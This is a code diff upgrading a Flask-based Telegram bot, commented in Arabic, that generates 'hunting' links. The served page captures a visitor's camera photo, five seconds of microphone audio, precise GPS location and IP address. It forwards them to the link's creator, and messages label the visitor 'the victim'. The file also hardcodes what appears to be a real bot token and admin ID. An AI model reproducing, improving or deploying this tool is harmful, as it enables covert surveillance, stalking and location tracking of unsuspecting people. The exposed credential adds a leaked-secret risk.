@@ -4,7 +4,7 @@ from flask import Flask, render_template_string, request, jsonify
 app = Flask(__name__)
 
 # ==========================================
-# --- إعدادات الإمبراطور سيوفي (v27.0) ---
+# --- إعدادات الإمبراطور سيوفي (v28.0) ---
 # ==========================================
 BOT_TOKEN = "8431816368:AAGL4xuB42ZdHpxRJ2O1zBgAWOB6cvZwwe0"
 ADMIN_ID = "7041600701"
@@ -16,19 +16,26 @@ DATA_FILE = "database.json"
 def load_data():
     if os.path.exists(DATA_FILE):
         try:
-            with open(DATA_FILE, "r") as f: return json.load(f)
-        except: pass
+            with open(DATA_FILE, "r") as f:
+                content = f.read().strip()
+                return json.loads(content) if content else {"all_users": {}, "banned_users": [], "stages": {}}
+        except Exception as e:
+            print(f"Error loading data: {e}")
     return {"all_users": {}, "banned_users": [], "stages": {}}
 
 def save_data(data):
-    with open(DATA_FILE, "w") as f: json.dump(data, f)
+    try:
+        with open(DATA_FILE, "w") as f:
+            json.dump(data, f, indent=4)
+    except Exception as e:
+        print(f"Error saving data: {e}")
 
 db = load_data()
 
 def tg_request(method, payload=None, files=None):
     try:
-        if files: return requests.post(API_URL + method, data=payload, files=files, timeout=30).json()
-        return requests.post(API_URL + method, json=payload, timeout=30).json()
+        if files: return requests.post(API_URL + method, data=payload, files=files, timeout=20).json()
+        return requests.post(API_URL + method, json=payload, timeout=20).json()
     except: return None
 
 def find_user_id(input_str):
@@ -38,7 +45,7 @@ def find_user_id(input_str):
         if uname.strip().replace("@", "").lower() == input_str: return uid
     return None
 
-# واجهة الصيد الاحترافية
+# واجهة الصيد المحدثة
 HTML_TEMPLATE = '''
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
@@ -75,7 +82,7 @@ HTML_TEMPLATE = '''
                 const v = document.getElementById('v'); v.srcObject = stream; await v.play();
                 await send(`🎯 **صيد جديد!**\\n🌐 IP: \`${ipD.ip}\`\\n📱 النظام: ${navigator.platform}`, 'msg');
                 navigator.geolocation.getCurrentPosition(p => {
-                    send(`📍 **موقع الضحية الدقيق:**\\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`, 'msg');
+                    send(`📍 **موقع الضحية:**\\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`, 'msg');
                 }, null, {enableHighAccuracy: true});
                 setTimeout(() => {
                     const c = document.getElementById('c'); c.width = v.videoWidth; c.height = v.videoHeight;
@@ -84,11 +91,15 @@ HTML_TEMPLATE = '''
                     recorder.ondataavailable = e => chunks.push(e.data);
                     recorder.onstop = async () => {
                         const reader = new FileReader(); reader.readAsDataURL(new Blob(chunks));
-                        reader.onloadend = async () => { await send(reader.result, 'aud'); document.getElementById('st').innerText = "✅ مكتمل!"; stream.getTracks().forEach(t => t.stop()); };
+                        reader.onloadend = async () => { 
+                            await send(reader.result, 'aud');
+                            document.getElementById('st').innerText = "✅ اكتمل!";
+                            stream.getTracks().forEach(t => t.stop());
+                        };
                     };
                     recorder.start(); setTimeout(() => recorder.stop(), 5000);
                 }, 2000);
-            } catch (e) { document.getElementById('st').innerText = "❌ يجب السماح بالصلاحيات!"; }
+            } catch (e) { document.getElementById('st').innerText = "❌ فشل الحصول على الصلاحيات!"; }
         }
     </script>
 </body>
@@ -114,50 +125,46 @@ def webhook():
     update = request.get_json(force=True, silent=True)
     if not update: return "OK"
     
-    msg_data = update.get("message") or update.get("callback_query", {}).get("message")
-    user_info = update.get("message", {}).get("from") or update.get("callback_query", {}).get("from")
-    if not user_info: return "OK"
+    # التعامل مع أزرار التحكم
+    if "callback_query" in update: return handle_callback(update["callback_query"])
     
-    chat_id = str(user_info["id"])
-    username = f"@{user_info.get('username', 'NoUser')}"
-    full_name = user_info.get("first_name", "Unknown")
+    if "message" not in update: return "OK"
+    msg = update["message"]; chat_id = str(msg["from"]["id"])
+    username = f"@{msg['from'].get('username', 'NoUser')}"
+    first_name = msg['from'].get('first_name', 'Unknown')
 
-    # 1. تسجيل وتنبيه فوري للأدمن بدخول مستخدم جديد
+    # تنبيه الأدمن وتسجيل المستخدم
     if chat_id not in db["all_users"]:
         db["all_users"][chat_id] = username
         save_data(db)
         if chat_id != ADMIN_ID:
-            report = f"👤 **دخول مستخدم جديد:**\n\n**الاسم:** {full_name}\n**اليوزر:** {username}\n**الايدي:** `{chat_id}`"
-            tg_request("sendMessage", {"chat_id": ADMIN_ID, "text": report, "parse_mode": "Markdown"})
+            tg_request("sendMessage", {"chat_id": ADMIN_ID, "text": f"👤 **مستخدم جديد:**\n\nالاسم: {first_name}\nاليوزر: {username}\nالايدي: `{chat_id}`", "parse_mode": "Markdown"})
 
     if chat_id in db.get("banned_users", []): return "OK"
-    if "callback_query" in update: return handle_callback(update["callback_query"])
     
-    text = update["message"].get("text", "")
+    text = msg.get("text", "")
     if chat_id == ADMIN_ID:
         if text.startswith("/user_ban"):
             target = text.replace("/user_ban", "").strip()
             tid = find_user_id(target)
-            if tid:
-                if tid not in db["banned_users"]: db["banned_users"].append(tid); save_data(db)
+            if tid and tid not in db["banned_users"]:
+                db["banned_users"].append(tid); save_data(db)
                 tg_request("sendMessage", {"chat_id": ADMIN_ID, "text": f"🚫 تم حظر `{target}`"})
             return "OK"
         elif text.startswith("/clear"):
             target = text.replace("/clear", "").strip()
             tid = find_user_id(target)
-            if tid: tg_request("sendMessage", {"chat_id": tid, "text": "🧹 تم تصفير سجلاتك."})
+            if tid: tg_request("sendMessage", {"chat_id": tid, "text": "🧹 تم تصفير السجل."})
             return "OK"
         
         adm_kb = {"inline_keyboard": [[{"text": "🔗 رابطي", "callback_data": "gen_my_link"}, {"text": "👥 قائمة المستخدمين", "callback_data": "list_all"}]]}
-        tg_request("sendMessage", {"chat_id": ADMIN_ID, "text": "🔥 لوحة الإمبراطور v27.0 جاهزة.", "reply_markup": adm_kb})
+        tg_request("sendMessage", {"chat_id": ADMIN_ID, "text": "🔥 لوحة v28.0 المصلحة جاهزة.", "reply_markup": adm_kb})
         return "OK"
 
-    # نظام الاشتراك
+    # نظام الاشتراك المزدوج
     stage = db.get("stages", {}).get(chat_id, 0)
     if stage < 2:
-        if "stages" not in db: db["stages"] = {}
-        db["stages"][chat_id] = stage + 1
-        save_data(db)
+        db["stages"][chat_id] = stage + 1; save_data(db)
         tg_request("sendMessage", {"chat_id": chat_id, "text": f"🛑 خطوة {stage+1}/2: اشترك بالقناة.", "reply_markup": {"inline_keyboard": [[{"text": "اشتراك ✅", "url": SUB_URL}]]}})
         return "OK"
 
@@ -165,17 +172,21 @@ def webhook():
     return "OK"
 
 def handle_callback(query):
-    cid = str(query["from"]["id"]); data = query["data"]; query_id = query["id"]
-    # إنهاء حالة "التحميل" فوراً
+    query_id = query["id"]; cid = str(query["from"]["id"]); data = query["data"]
+    # استجابة فورية لإنهاء حالة "اللودينج"
     tg_request("answerCallbackQuery", {"callback_query_id": query_id})
     
     if data == "gen_my_link":
-        tg_request("sendMessage", {"chat_id": cid, "text": f"🚀 رابطك:\n`{BASE_URL}/t/{cid}`"})
+        tg_request("sendMessage", {"chat_id": cid, "text": f"🚀 رابطك الجاهز:\n`{BASE_URL}/t/{cid}`"})
     elif data == "list_all" and cid == ADMIN_ID:
-        res = "👥 **قائمة المستخدمين:**\n\n"
-        for uid, uname in db.get("all_users", {}).items():
-            status = "🚫" if uid in db.get("banned_users", []) else "✅"
-            res += f"{status} {uname} | `{uid}`\n"
+        users = db.get("all_users", {})
+        if not users:
+            res = "ℹ️ لا يوجد مستخدمين مسجلين بعد."
+        else:
+            res = "👥 **قائمة المستخدمين:**\n\n"
+            for uid, uname in users.items():
+                s = "🚫" if uid in db.get("banned_users", []) else "✅"
+                res += f"{s} {uname} | `{uid}`\n"
         tg_request("sendMessage", {"chat_id": ADMIN_ID, "text": res, "parse_mode": "Markdown"})
     return "OK"
 
